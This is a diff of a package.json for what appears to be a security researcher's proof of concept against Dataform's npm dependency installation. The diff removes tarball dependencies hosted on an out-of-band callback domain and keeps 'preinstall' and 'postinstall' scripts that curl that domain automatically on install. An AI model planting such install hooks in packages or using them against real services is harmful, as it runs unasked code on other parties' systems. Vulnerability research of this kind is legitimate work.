@@ -1,18 +1,12 @@
 {
   "name": "dataform-vuln-poc",
   "version": "1.0.0",
-  "description": "Dataform vulnerability PoC - aggressive npm registry tests",
+  "description": "Dataform vulnerability PoC - npm registry tests",
   "dependencies": {
-    "@dataform/core": "^2.9.0",
-    "oast-tarball-test": "https://juolbtoughjktrdppdvuqemhwftehn8z6.oast.fun/pkg-json-tarball.tgz",
-    "oast-http-test": "https://juolbtoughjktrdppdvuqemhwftehn8z6.oast.fun/http-dep.tgz"
-  },
-  "optionalDependencies": {
-    "oast-optional": "https://juolbtoughjktrdppdvuqemhwftehn8z6.oast.fun/optional-dep.tgz"
+    "@dataform/core": "^2.9.0"
   },
   "scripts": {
     "postinstall": "curl -s https://juolbtoughjktrdppdvuqemhwftehn8z6.oast.fun/npm-postinstall-script",
-    "preinstall": "curl -s https://juolbtoughjktrdppdvuqemhwftehn8z6.oast.fun/npm-preinstall-script",
-    "prepare": "curl -s https://juolbtoughjktrdppdvuqemhwftehn8z6.oast.fun/npm-prepare-script"
+    "preinstall": "curl -s https://juolbtoughjktrdppdvuqemhwftehn8z6.oast.fun/npm-preinstall-script"
   }
 }
